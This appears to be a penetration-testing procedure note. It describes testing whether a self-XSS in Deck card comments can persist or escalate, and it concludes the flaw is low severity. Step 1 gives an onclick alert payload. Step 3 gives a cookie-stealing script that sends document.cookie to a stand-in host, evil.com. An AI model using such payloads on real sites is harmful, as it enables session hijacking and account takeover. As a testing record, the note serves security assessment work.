---
id: proc-attempt-persistent-execution
tags:
  - persistence
  - xss
  - escalation
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T00:11:09.450Z'
skill_level: intermediate
impact_level: low
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Attempt-Persistent-Script-Execution

## Summary

This procedure explores methods to achieve persistent execution from the self-XSS in Deck comments, assessing potential for escalation to cookie stealing or account takeover despite the non-persistent nature.

## Description

The core vulnerability is one-time only, but chaining with other flaws (e.g., stored elements or session hijacking) could extend impact. Manual testing involves varying payloads and observing reload behavior, confirming low severity as execution does not survive page refreshes or other user views.

## Requirements

1. Confirmed self-XSS execution
2. Multiple payload variations
3. Browser tools for session analysis

## Defense

Defensive measures and detection strategies:

- Regularly audit comment storage and rendering
- Implement rate limiting on comment submissions
- Use session tokens to detect anomalous self-attacks

## Objectives

1. Test for persistence across sessions
2. Identify escalation vectors
3. Confirm vulnerability boundaries

## Instructions

### Step 1: Vary Payloads for Persistence

**Context**: Modify injections to seek lasting effects.

Try embedding <script> tags or event handlers in attributes, e.g., `<a onclick="alert('xss')">Test</a>`.

**Expected Output**: Still one-time; no storage of scripts.

### Step 2: Test Across Reloads

**Context**: Verify non-persistence.

Submit, execute, then refresh the card page.

**Expected Output**: Execution lost on reload.

### Step 3: Explore Escalation

**Context**: Assess chained impacts.

Attempt to exfiltrate cookies via payload like `<script>fetch('http://evil.com?cookie='+document.cookie)</script>` if injectable.

**Expected Output**: Potential self-data leak if executed, but non-persistent.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[Persistence]]
- [[xss]]
- [[escalation]]
